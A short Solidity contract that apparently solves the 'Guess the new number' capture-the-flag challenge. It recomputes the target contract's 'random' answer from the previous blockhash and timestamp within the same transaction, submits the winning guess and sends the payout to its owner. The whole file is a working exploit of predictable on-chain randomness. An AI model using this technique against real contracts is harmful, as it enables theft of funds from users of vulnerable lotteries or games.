//SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberChallenge {
    IGuessTheNewNumberChallenge public challenge = IGuessTheNewNumberChallenge(0x0Ecdf0Cd16206C2d86CaD53cF3D6dBedE6a04A11);
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        require(msg.value == 1 ether, "You must send 1 ether");

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
